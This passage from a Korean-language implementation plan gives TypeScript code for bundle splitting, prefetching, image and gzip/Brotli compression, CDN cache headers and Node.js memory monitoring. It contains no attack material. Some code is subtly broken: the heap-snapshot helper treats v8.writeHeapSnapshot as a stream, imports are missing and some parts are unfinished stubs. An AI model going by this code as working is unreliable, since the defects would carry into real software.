    const sizeInMB = stats.size / (1024 * 1024);
    
    if (sizeInMB > 45) {
      throw new Error(`Lambda function ${functionName} bundle size (${sizeInMB.toFixed(2)}MB) exceeds safe limit`);
    }
    
    console.log(`✅ ${functionName} bundle size: ${sizeInMB.toFixed(2)}MB`);
  }
}

// 동적 임포트 헬퍼
export class DynamicImportManager {
  private loadedModules: Map<string, any> = new Map();
  
  // 에이전트 동적 로딩
  async loadAgent(agentName: string): Promise<any> {
    const cached = this.loadedModules.get(agentName);
    if (cached) {
      return cached;
    }
    
    try {
      const module = await import(
        /* webpackChunkName: "[request]" */
        `../agents/${agentName}-agent`
      );
      
      this.loadedModules.set(agentName, module.default);
      return module.default;
      
    } catch (error) {
      logger.error(`Failed to load agent ${agentName}:`, error);
      throw error;
    }
  }
  
  // 프리로드 힌트 생성
  generatePreloadHints(requiredAgents: string[]): string[] {
    return requiredAgents.map(agent => 
      `<link rel="preload" href="/agents/${agent}.js" as="script">`
    );
  }
  
  // 모듈 언로드
  unloadModule(moduleName: string): void {
    this.loadedModules.delete(moduleName);
    
    // 메모리에서 require 캐시 제거
    const resolvedPath = require.resolve(`../agents/${moduleName}-agent`);
    delete require.cache[resolvedPath];
  }
}

// 프론트엔드 코드 스플리팅 설정
export const frontendViteConfig = {
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          // 벤더 청크
          'vendor-react': ['react', 'react-dom', 'react-router-dom'],
          'vendor-ui': ['@mui/material', '@emotion/react', '@emotion/styled'],
          'vendor-utils': ['axios', 'lodash', 'date-fns'],
          'vendor-charts': ['recharts', 'd3'],
          
          // 기능별 청크
          'feature-editor': ['monaco-editor', '@monaco-editor/react'],
          'feature-analytics': ['./src/features/analytics/index.ts'],
          'feature-auth': ['./src/features/auth/index.ts']
        },
        // 청크 파일명 형식
        chunkFileNames: (chunkInfo) => {
          const facadeModuleId = chunkInfo.facadeModuleId ? 
            path.basename(chunkInfo.facadeModuleId, path.extname(chunkInfo.facadeModuleId)) : 
            'chunk';
          return `${facadeModuleId}.[hash].js`;
        }
      }
    },
    // 압축 설정
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: process.env.NODE_ENV === 'production',
        drop_debugger: true,
        pure_funcs: ['console.log', 'console.debug'],
        passes: 2
      }
    },
    // 청크 크기 경고
    chunkSizeWarningLimit: 500,
    // CSS 코드 스플리팅
    cssCodeSplit: true,
    // 소스맵 설정
    sourcemap: process.env.NODE_ENV !== 'production'
  },
  optimizeDeps: {
    include: ['react', 'react-dom'],
    exclude: ['@aws-sdk']
  }
};

// 런타임 코드 스플리팅 컴포넌트
export const LazyComponent = (importFunc: () => Promise<any>) => {
  return React.lazy(async () => {
    const startTime = performance.now();
    
    try {
      const module = await importFunc();
      const loadTime = performance.now() - startTime;
      
      // 로딩 성능 메트릭
      if (window.performance && window.performance.measure) {
        window.performance.measure('component-load', {
          start: startTime,
          duration: loadTime
        });
      }
      
      return module;
    } catch (error) {
      console.error('Failed to load component:', error);
      
      // 폴백 컴포넌트 반환
      return {
        default: () => <div>Failed to load component</div>
      };
    }
  });
};

// 프리페치 매니저
export class PrefetchManager {
  private prefetchQueue: Set<string> = new Set();
  private observer: IntersectionObserver;
  
  constructor() {
    // Intersection Observer로 뷰포트 진입 감지
    this.observer = new IntersectionObserver(
      (entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) {
            const component = entry.target.getAttribute('data-prefetch');
            if (component) {
              this.prefetchComponent(component);
            }
          }
        });
      },
      { rootMargin: '50px' }
    );
  }
  
  // 컴포넌트 프리페치
  async prefetchComponent(componentPath: string): Promise<void> {
    if (this.prefetchQueue.has(componentPath)) {
      return;
    }
    
    this.prefetchQueue.add(componentPath);
    
    try {
      // 네트워크가 idle 상태일 때 프리페치
      if ('requestIdleCallback' in window) {
        requestIdleCallback(() => {
          import(componentPath);
        });
      } else {
        // 폴백: setTimeout 사용
        setTimeout(() => {
          import(componentPath);
        }, 1);
      }
    } catch (error) {
      console.error(`Failed to prefetch ${componentPath}:`, error);
    }
  }
  
  // 라우트 기반 프리페치
  prefetchRoute(route: string): void {
    const routeComponents: Record<string, string[]> = {
      '/dashboard': [
        './features/dashboard/index',
        './features/analytics/index'
      ],
      '/projects': [
        './features/projects/index',
        './features/editor/index'
      ],
      '/components': [
        './features/components/index',
        './features/search/index'
      ]
    };
    
    const components = routeComponents[route] || [];
    components.forEach(comp => this.prefetchComponent(comp));
  }
  
  // 엘리먼트 관찰 시작
  observe(element: HTMLElement): void {
    this.observer.observe(element);
  }
  
  // 정리
  disconnect(): void {
    this.observer.disconnect();
    this.prefetchQueue.clear();
  }
}
```

### SubTask 0.11.5: 리소스 최적화 및 압축
**목표**: 정적 리소스 최적화 및 압축 전략

**구현 내용**:
```typescript
// backend/src/performance/resource-optimizer.ts
import sharp from 'sharp';
import imagemin from 'imagemin';
import imageminPngquant from 'imagemin-pngquant';
import imageminMozjpeg from 'imagemin-mozjpeg';
import imageminSvgo from 'imagemin-svgo';
import { createReadStream, createWriteStream } from 'fs';
import { pipeline } from 'stream/promises';
import zlib from 'zlib';
import crypto from 'crypto';

// 이미지 최적화 서비스
export class ImageOptimizationService {
  private readonly cachePath = './cache/images';
  private readonly supportedFormats = ['jpeg', 'jpg', 'png', 'webp', 'avif'];
  
  // 이미지 최적화
  async optimizeImage(
    inputPath: string,
    outputPath: string,
    options: {
      width?: number;
      height?: number;
      quality?: number;
      format?: string;
    } = {}
  ): Promise<void> {
    const { width, height, quality = 85, format } = options;
    
    // Sharp를 사용한 이미지 처리
    let sharpInstance = sharp(inputPath);
    
    // 리사이징
    if (width || height) {
      sharpInstance = sharpInstance.resize(width, height, {
        fit: 'inside',
        withoutEnlargement: true
      });
    }
    
    // 포맷 변환
    if (format && this.supportedFormats.includes(format)) {
      sharpInstance = sharpInstance.toFormat(format as any, { quality });
    }
    
    // 메타데이터 제거
    sharpInstance = sharpInstance.withMetadata({
      exif: false,
      icc: false,
      iptc: false,
      xmp: false
    });
    
    await sharpInstance.toFile(outputPath);
    
    // 추가 최적화
    await this.furtherOptimize(outputPath, format || 'jpeg');
  }
  
  // 추가 최적화 (imagemin 사용)
  private async furtherOptimize(filePath: string, format: string): Promise<void> {
    const plugins = [];
    
    switch (format) {
      case 'jpeg':
      case 'jpg':
        plugins.push(imageminMozjpeg({ quality: 85 }));
        break;
      case 'png':
        plugins.push(imageminPngquant({ quality: [0.6, 0.8] }));
        break;
      case 'svg':
        plugins.push(imageminSvgo());
        break;
    }
    
    if (plugins.length > 0) {
      await imagemin([filePath], {
        destination: path.dirname(filePath),
        plugins
      });
    }
  }
  
  // 반응형 이미지 생성
  async generateResponsiveImages(
    inputPath: string,
    outputDir: string,
    breakpoints: number[] = [320, 640, 960, 1280, 1920]
  ): Promise<Record<string, string>> {
    const results: Record<string, string> = {};
    const format = 'webp'; // 현대적인 포맷 사용
    
    for (const width of breakpoints) {
      const outputName = `image-${width}w.${format}`;
      const outputPath = path.join(outputDir, outputName);
      
      await this.optimizeImage(inputPath, outputPath, {
        width,
        format,
        quality: this.getQualityForWidth(width)
      });
      
      results[`${width}w`] = outputPath;
    }
    
    // 원본도 최적화
    const originalName = `image-original.${format}`;
    const originalPath = path.join(outputDir, originalName);
    await this.optimizeImage(inputPath, originalPath, { format });
    results['original'] = originalPath;
    
    return results;
  }
  
  // 너비에 따른 품질 결정
  private getQualityForWidth(width: number): number {
    if (width <= 640) return 70;
    if (width <= 1280) return 80;
    return 85;
  }
  
  // 이미지 캐싱 키 생성
  generateCacheKey(options: any): string {
    const hash = crypto
      .createHash('md5')
      .update(JSON.stringify(options))
      .digest('hex');
    return hash;
  }
}

// 파일 압축 서비스
export class CompressionService {
  // Gzip 압축
  async gzipFile(inputPath: string, outputPath: string): Promise<void> {
    const gzip = zlib.createGzip({ level: 9 });
    await pipeline(
      createReadStream(inputPath),
      gzip,
      createWriteStream(outputPath)
    );
  }
  
  // Brotli 압축
  async brotliFile(inputPath: string, outputPath: string): Promise<void> {
    const brotli = zlib.createBrotliCompress({
      params: {
        [zlib.constants.BROTLI_PARAM_QUALITY]: 11
      }
    });
    await pipeline(
      createReadStream(inputPath),
      brotli,
      createWriteStream(outputPath)
    );
  }
  
  // 자동 압축 결정
  async compressFile(
    inputPath: string,
    outputDir: string,
    acceptEncoding: string = ''
  ): Promise<string> {
    const filename = path.basename(inputPath);
    const stats = await fs.stat(inputPath);
    
    // 작은 파일은 압축하지 않음
    if (stats.size < 1024) {
      return inputPath;
    }
    
    // Brotli 지원 확인
    if (acceptEncoding.includes('br')) {
      const brotliPath = path.join(outputDir, `${filename}.br`);
      await this.brotliFile(inputPath, brotliPath);
      
      const brotliStats = await fs.stat(brotliPath);
      if (brotliStats.size < stats.size * 0.9) {
        return brotliPath;
      }
    }
    
    // Gzip 압축
    if (acceptEncoding.includes('gzip')) {
      const gzipPath = path.join(outputDir, `${filename}.gz`);
      await this.gzipFile(inputPath, gzipPath);
      
      const gzipStats = await fs.stat(gzipPath);
      if (gzipStats.size < stats.size * 0.9) {
        return gzipPath;
      }
    }
    
    return inputPath;
  }
}

// CDN 최적화 헤더
export class CDNOptimizer {
  // 파일 타입별 캐시 정책
  private cacheRules: Record<string, string> = {
    // 불변 리소스 (해시가 있는 파일)
    'js.hash': 'public, max-age=31536000, immutable',
    'css.hash': 'public, max-age=31536000, immutable',
    'jpg': 'public, max-age=86400, stale-while-revalidate=604800',
    'png': 'public, max-age=86400, stale-while-revalidate=604800',
    'webp': 'public, max-age=86400, stale-while-revalidate=604800',
    'svg': 'public, max-age=86400, stale-while-revalidate=604800',
    'woff2': 'public, max-age=31536000, immutable',
    'json': 'no-cache, must-revalidate',
    'html': 'no-cache, no-store, must-revalidate'
  };
  
  // 캐시 헤더 생성
  getCacheHeaders(filename: string): Record<string, string> {
    const ext = path.extname(filename).slice(1);
    const hasHash = /\.[a-f0-9]{8,}\./i.test(filename);
    
    const cacheKey = hasHash ? `${ext}.hash` : ext;
    const cacheControl = this.cacheRules[cacheKey] || 'public, max-age=3600';
    
    return {
      'Cache-Control': cacheControl,
      'Vary': 'Accept-Encoding',
      'X-Content-Type-Options': 'nosniff'
    };
  }
  
  // 조건부 요청 처리
  handleConditionalRequest(
    req: Request,
    res: Response,
    fileStats: fs.Stats,
    etag: string
  ): boolean {
    // ETag 확인
    if (req.headers['if-none-match'] === etag) {
      res.status(304).end();
      return true;
    }
    
    // Last-Modified 확인
    const lastModified = fileStats.mtime.toUTCString();
    if (req.headers['if-modified-since'] === lastModified) {
      res.status(304).end();
      return true;
    }
    
    // 헤더 설정
    res.setHeader('ETag', etag);
    res.setHeader('Last-Modified', lastModified);
    
    return false;
  }
  
  // 파일 ETag 생성
  generateETag(content: Buffer | string): string {
    const hash = crypto
      .createHash('md5')
      .update(content)
      .digest('hex');
    return `"${hash}"`;
  }
}

// 리소스 최적화 미들웨어
export function resourceOptimizationMiddleware(options: {
  imageOptimizer: ImageOptimizationService;
  compressionService: CompressionService;
  cdnOptimizer: CDNOptimizer;
}) {
  const { imageOptimizer, compressionService, cdnOptimizer } = options;
  
  return async (req: Request, res: Response, next: NextFunction) => {
    // 정적 리소스 요청이 아니면 통과
    if (!req.path.match(/\.(jpg|jpeg|png|webp|svg|js|css|woff2)$/i)) {
      return next();
    }
    
    const filePath = path.join(process.cwd(), 'public', req.path);
    
    try {
      const stats = await fs.stat(filePath);
      
      // 조건부 요청 처리
      const content = await fs.readFile(filePath);
      const etag = cdnOptimizer.generateETag(content);
      
      if (cdnOptimizer.handleConditionalRequest(req, res, stats, etag)) {
        return;
      }
      
      // 캐시 헤더 설정
      const cacheHeaders = cdnOptimizer.getCacheHeaders(req.path);
      Object.entries(cacheHeaders).forEach(([key, value]) => {
        res.setHeader(key, value);
      });
      
      // 이미지 최적화
      if (req.path.match(/\.(jpg|jpeg|png|webp)$/i)) {
        const acceptHeader = req.headers.accept || '';
        const supportsWebP = acceptHeader.includes('image/webp');
        const supportsAvif = acceptHeader.includes('image/avif');
        
        // 최적 포맷 선택
        let format = 'original';
        if (supportsAvif) format = 'avif';
        else if (supportsWebP) format = 'webp';
        
        if (format !== 'original') {
          const cacheKey = imageOptimizer.generateCacheKey({
            path: req.path,
            format,
            width: req.query.w,
            quality: req.query.q
          });
          
          // 캐시 확인 및 최적화
          // ... 구현
        }
      }
      
      // 압축
      const acceptEncoding = req.headers['accept-encoding'] || '';
      const compressedPath = await compressionService.compressFile(
        filePath,
        path.dirname(filePath),
        acceptEncoding
      );
      
      // 압축된 파일 전송
      if (compressedPath !== filePath) {
        const encoding = compressedPath.endsWith('.br') ? 'br' : 'gzip';
        res.setHeader('Content-Encoding', encoding);
      }
      
      res.sendFile(compressedPath);
      
    } catch (error) {
      next(error);
    }
  };
}

// 리소스 힌트 생성기
export class ResourceHintGenerator {
  // 리소스 힌트 생성
  generateHints(resources: Array<{ url: string; type: string; priority?: string }>): string[] {
    const hints: string[] = [];
    
    resources.forEach(resource => {
      // Preconnect (외부 도메인)
      if (resource.url.startsWith('http')) {
        const origin = new URL(resource.url).origin;
        hints.push(`<link rel="preconnect" href="${origin}">`);
        hints.push(`<link rel="dns-prefetch" href="${origin}">`);
      }
      
      // Preload (중요 리소스)
      if (resource.priority === 'high') {
        const as = this.getResourceType(resource.type);
        hints.push(`<link rel="preload" href="${resource.url}" as="${as}">`);
      }
      
      // Prefetch (다음에 필요한 리소스)
      if (resource.priority === 'low') {
        hints.push(`<link rel="prefetch" href="${resource.url}">`);
      }
    });
    
    // 중복 제거
    return [...new Set(hints)];
  }
  
  private getResourceType(mimeType: string): string {
    if (mimeType.includes('javascript')) return 'script';
    if (mimeType.includes('css')) return 'style';
    if (mimeType.includes('image')) return 'image';
    if (mimeType.includes('font')) return 'font';
    return 'fetch';
  }
  
  // Critical CSS 추출
  async extractCriticalCSS(html: string, css: string): Promise<string> {
    // 실제 구현에서는 puppeteer나 penthouse 사용
    // 여기서는 간단한 예시
    const criticalSelectors = [
      'body', 'header', 'nav', 'main',
      '.hero', '.container', '.btn-primary'
    ];
    
    // CSS 파싱 및 필터링
    // ... 구현
    
    return css; // 임시
  }
}
```

---

### SubTask 0.11.6: 메모리 관리 최적화
**목표**: Node.js 애플리케이션의 메모리 사용 최적화

**구현 내용**:
```typescript
// backend/src/performance/memory-manager.ts
import v8 from 'v8';
import { performance } from 'perf_hooks';
import { EventEmitter } from 'events';
import { logger } from '../config/logger';

// 메모리 임계값 설정 (MB)
const MEMORY_THRESHOLDS = {
  WARNING: 1024,    // 1GB
  CRITICAL: 1536,   // 1.5GB
  MAX: 2048        // 2GB
};

export class MemoryManager extends EventEmitter {
  private monitoringInterval: NodeJS.Timer | null = null;
  private gcForceThreshold = 0.85; // 힙 사용률 85%에서 GC 강제 실행
  private memoryLeakDetector: MemoryLeakDetector;
  
  constructor() {
    super();
    this.memoryLeakDetector = new MemoryLeakDetector();
    this.setupGCEvents();
  }
  
  // 메모리 모니터링 시작
  startMonitoring(intervalMs: number = 30000): void {
    if (this.monitoringInterval) {
      return;
    }
    
    this.monitoringInterval = setInterval(() => {
      this.checkMemoryUsage();
    }, intervalMs);
    
    logger.info('Memory monitoring started');
  }
  
  // 메모리 모니터링 중지
  stopMonitoring(): void {
    if (this.monitoringInterval) {
      clearInterval(this.monitoringInterval);
      this.monitoringInterval = null;
      logger.info('Memory monitoring stopped');
    }
  }
  
  // 현재 메모리 상태 조회
  getMemoryStatus(): MemoryStatus {
    const memUsage = process.memoryUsage();
    const heapStats = v8.getHeapStatistics();
    
    const heapUsedMB = memUsage.heapUsed / 1024 / 1024;
    const heapTotalMB = memUsage.heapTotal / 1024 / 1024;
    const rssMB = memUsage.rss / 1024 / 1024;
    const externalMB = memUsage.external / 1024 / 1024;
    
    const heapUsagePercent = (heapStats.used_heap_size / heapStats.heap_size_limit) * 100;
    
    return {
      rss: rssMB,
      heapUsed: heapUsedMB,
      heapTotal: heapTotalMB,
      external: externalMB,
      heapUsagePercent,
      heapSizeLimit: heapStats.heap_size_limit / 1024 / 1024,
      totalPhysicalSize: heapStats.total_physical_size / 1024 / 1024,
      totalAvailableSize: heapStats.total_available_size / 1024 / 1024,
      usedHeapSize: heapStats.used_heap_size / 1024 / 1024,
      heapSpaces: this.getHeapSpaceInfo()
    };
  }
  
  // 힙 공간별 정보
  private getHeapSpaceInfo(): HeapSpaceInfo[] {
    const spaces = v8.getHeapSpaceStatistics();
    return spaces.map(space => ({
      spaceName: space.space_name,
      spaceSize: space.space_size / 1024 / 1024,
      spaceUsedSize: space.space_used_size / 1024 / 1024,
      spaceAvailableSize: space.space_available_size / 1024 / 1024,
      physicalSpaceSize: space.physical_space_size / 1024 / 1024
    }));
  }
  
  // 메모리 사용량 확인
  private checkMemoryUsage(): void {
    const status = this.getMemoryStatus();
    
    // 임계값 확인
    if (status.heapUsed > MEMORY_THRESHOLDS.CRITICAL) {
      this.emit('memory:critical', status);
      this.handleCriticalMemory(status);
    } else if (status.heapUsed > MEMORY_THRESHOLDS.WARNING) {
      this.emit('memory:warning', status);
    }
    
    // 힙 사용률 확인
    if (status.heapUsagePercent > this.gcForceThreshold * 100) {
      this.forceGarbageCollection();
    }
    
    // 메모리 누수 감지
    this.memoryLeakDetector.addSample(status);
    
    // 메트릭 기록
    this.recordMemoryMetrics(status);
  }
  
  // 위험 메모리 상태 처리
  private handleCriticalMemory(status: MemoryStatus): void {
    logger.error('Critical memory usage detected', status);
    
    // 1. 강제 가비지 컬렉션
    this.forceGarbageCollection();
    
    // 2. 캐시 정리
    this.emit('memory:cleanup:cache');
    
    // 3. 대용량 객체 해제
    this.emit('memory:cleanup:objects');
    
    // 4. 여전히 높으면 일부 기능 제한
    if (status.heapUsed > MEMORY_THRESHOLDS.MAX) {
      this.emit('memory:limit:features');
    }
  }
  
  // 강제 가비지 컬렉션
  private forceGarbageCollection(): void {
    if (global.gc) {
      const before = process.memoryUsage().heapUsed;
      global.gc();
      const after = process.memoryUsage().heapUsed;
      const freed = (before - after) / 1024 / 1024;
      
      logger.info(`Forced GC: freed ${freed.toFixed(2)} MB`);
    }
  }
  
  // GC 이벤트 설정
  private setupGCEvents(): void {
    if (!performance.nodeTiming) return;
    
    const obs = new PerformanceObserver((list) => {
      const entries = list.getEntries();
      entries.forEach((entry) => {
        if (entry.entryType === 'gc') {
          this.handleGCEvent(entry as any);
        }
      });
    });
    
    obs.observe({ entryTypes: ['gc'] });
  }
  
  // GC 이벤트 처리
  private handleGCEvent(gcEntry: any): void {
    const gcInfo = {
      type: gcEntry.detail.kind,
      duration: gcEntry.duration,
      timestamp: gcEntry.startTime
    };
    
    this.emit('gc', gcInfo);
    
    // 긴 GC 경고
    if (gcEntry.duration > 100) {
      logger.warn('Long GC detected', gcInfo);
    }
  }
  
  // 메모리 메트릭 기록
  private recordMemoryMetrics(status: MemoryStatus): void {
    // Prometheus 메트릭 업데이트
    const { MetricsHelper } = require('../config/metrics');
    MetricsHelper.recordMemoryUsage(status);
  }
  
  // 힙 스냅샷 생성
  async createHeapSnapshot(filename?: string): Promise<string> {
    const snapshotPath = filename || `heapdump-${Date.now()}.heapsnapshot`;
    
    return new Promise((resolve, reject) => {
      const stream = v8.writeHeapSnapshot(snapshotPath);
      stream.on('finish', () => {
        logger.info(`Heap snapshot created: ${snapshotPath}`);
        resolve(snapshotPath);
      });
      stream.on('error', reject);
    });
  }
  
  // 메모리 프로파일링
  async profileMemory(durationMs: number = 60000): Promise<MemoryProfile> {
    const startUsage = process.memoryUsage();
    const samples: MemoryStatus[] = [];
    const interval = 1000; // 1초마다 샘플링
    
    const samplingInterval = setInterval(() => {
      samples.push(this.getMemoryStatus());
    }, interval);
    
    await new Promise(resolve => setTimeout(resolve, durationMs));
    clearInterval(samplingInterval);
    
    const endUsage = process.memoryUsage();
    
    return {
      duration: durationMs,
      samples,
      startUsage,
      endUsage,
      summary: this.analyzeMemoryProfile(samples)
    };
  }
  
  // 메모리 프로파일 분석
  private analyzeMemoryProfile(samples: MemoryStatus[]): MemoryProfileSummary {
    const heapUsedValues = samples.map(s => s.heapUsed);
    
    return {
      avgHeapUsed: heapUsedValues.reduce((a, b) => a + b, 0) / heapUsedValues.length,
      maxHeapUsed: Math.max(...heapUsedValues),
      minHeapUsed: Math.min(...heapUsedValues),
      trend: this.calculateMemoryTrend(heapUsedValues),
      volatility: this.calculateVolatility(heapUsedValues)
    };
  }
  
  // 메모리 추세 계산
  private calculateMemoryTrend(values: number[]): 'increasing' | 'stable' | 'decreasing' {
    if (values.length < 2) return 'stable';
    
    const firstHalf = values.slice(0, Math.floor(values.length / 2));
    const secondHalf = values.slice(Math.floor(values.length / 2));
    
    const firstAvg = firstHalf.reduce((a, b) => a + b, 0) / firstHalf.length;
    const secondAvg = secondHalf.reduce((a, b) => a + b, 0) / secondHalf.length;
    
    const change = ((secondAvg - firstAvg) / firstAvg) * 100;
    
    if (change > 10) return 'increasing';
    if (change < -10) return 'decreasing';
    return 'stable';
  }
  
  // 변동성 계산
  private calculateVolatility(values: number[]): number {
    const mean = values.reduce((a, b) => a + b, 0) / values.length;
    const variance = values.reduce((sum, val) => sum + Math.pow(val - mean, 2), 0) / values.length;
    return Math.sqrt(variance);
  }
}

// 메모리 누수 감지기
class MemoryLeakDetector {
  private samples: MemoryStatus[] = [];
  private readonly maxSamples = 60; // 30분간 데이터 (30초 간격)
  private readonly leakThreshold = 0.1; // 10% 증가율
  
  addSample(status: MemoryStatus): void {
    this.samples.push(status);
    
    if (this.samples.length > this.maxSamples) {
      this.samples.shift();
    }
    
    if (this.samples.length >= 10) {
      this.detectLeak();
    }
  }
  
  private detectLeak(): void {
    const recentSamples = this.samples.slice(-10);
    const trend = this.calculateTrend(recentSamples);
    
    if (trend.slope > this.leakThreshold && trend.r2 > 0.8) {
      logger.warn('Potential memory leak detected', {
        slope: trend.slope,
        r2: trend.r2,
        currentHeap: recentSamples[recentSamples.length - 1].heapUsed
      });
    }
  }
  
  // 선형 회귀 분석
  private calculateTrend(samples: MemoryStatus[]): { slope: number; r2: number } {
    const n = samples.length;
    const x = samples.map((_, i) => i);
    const y = samples.map(s => s.heapUsed);
    
    const sumX = x.reduce((a, b) => a + b, 0);
    const sumY = y.reduce((a, b) => a + b, 0);
    const sumXY = x.reduce((sum, xi, i) => sum + xi * y[i], 0);
    const sumX2 = x.reduce((sum, xi) => sum + xi * xi, 0);
    
    const slope = (n * sumXY - sumX * sumY) / (n * sumX2 - sumX * sumX);
    const intercept = (sumY - slope * sumX) / n;
    
    // R² 계산
    const yMean = sumY / n;
    const ssTotal = y.reduce((sum, yi) => sum + Math.pow(yi - yMean, 2), 0);
    const ssResidual = y.reduce((sum, yi, i) => {
      const prediction = slope * x[i] + intercept;
      return sum + Math.pow(yi - prediction, 2);
    }, 0);
    
    const r2 = 1 - (ssResidual / ssTotal);
    
    return { slope: slope / yMean, r2 }; // 정규화된 기울기
  }
}

// 메모리 풀 관리자
export class MemoryPoolManager<T> {
  private pool: T[] = [];
  private inUse: Set<T> = new Set();
  private factory: () => T;
  private reset: (obj: T) => void;
  private maxSize: number;
  
  constructor(options: {
    factory: () => T;
    reset: (obj: T) => void;
    initialSize?: number;
    maxSize?: number;
  }) {
    this.factory = options.factory;
    this.reset = options.reset;
    this.maxSize = options.maxSize || 100;
    
    // 초기 풀 생성
    const initialSize = options.initialSize || 10;
    for (let i = 0; i < initialSize; i++) {
      this.pool.push(this.factory());
    }
  }
  
  // 객체 획득
  acquire(): T {
    let obj = this.pool.pop();
    
    if (!obj) {
      obj = this.factory();
    }
    
    this.inUse.add(obj);
    return obj;
  }
  
  // 객체 반환
  release(obj: T): void {
    if (!this.inUse.has(obj)) {
      return;
    }
    
    this.inUse.delete(obj);
    this.reset(obj);
    
    if (this.pool.length < this.maxSize) {
      this.pool.push(obj);
    }
  }
  
  // 풀 상태
  getStats(): { poolSize: number; inUse: number } {
    return {
      poolSize: this.pool.length,
      inUse: this.inUse.size
    };
  }
  
  // 풀 정리
  clear(): void {
    this.pool = [];
    this.inUse.clear();
  }
}

// WeakMap 기반 캐시
export class WeakCache<K extends object, V> {
  private cache = new WeakMap<K, { value: V; timestamp: number }>();
  private ttl: number;
  
  constructor(ttlMs: number = 60000) {
    this.ttl = ttlMs;
  }
  
  set(key: K, value: V): void {
    this.cache.set(key, {
      value,
      timestamp: Date.now()
    });
  }
  
  get(key: K): V | undefined {
    const entry = this.cache.get(key);
    
    if (!entry) {
      return undefined;
    }
    
    if (Date.now() - entry.timestamp > this.ttl) {
      this.cache.delete(key);
      return undefined;
    }
    
    return entry.value;
  }
  
  has(key: K): boolean {
    return this.get(key) !== undefined;
  }
  
  delete(key: K): boolean {
    return this.cache.delete(key);
  }
}

// 타입 정의
interface MemoryStatus {
  rss: number;
  heapUsed: number;
  heapTotal: number;
  external: number;
  heapUsagePercent: number;
  heapSizeLimit: number;
  totalPhysicalSize: number;
  totalAvailableSize: number;
  usedHeapSize: number;
  heapSpaces: HeapSpaceInfo[];
}

interface HeapSpaceInfo {
  spaceName: string;
  spaceSize: number;
  spaceUsedSize: number;
  spaceAvailableSize: number;
  physicalSpaceSize: number;
}

interface MemoryProfile {
  duration: number;
  samples: MemoryStatus[];
  startUsage: NodeJS.MemoryUsage;
  endUsage: NodeJS.MemoryUsage;
  summary: MemoryProfileSummary;
}

interface MemoryProfileSummary {
  avgHeapUsed: number;
  maxHeapUsed: number;
  minHeapUsed: number;
  trend: 'increasing' | 'stable' | 'decreasing';
  volatility: number;
}
```

**🔧 사용자 작업**:
- Node.js 실행 시 `--expose-gc` 플래그 추가
- 메모리 임계값을 환경에 맞게 조정
- 메모리 누수 감지 시 알림 설정
- 정기적인 힙 스냅샷 생성 스케줄 설정
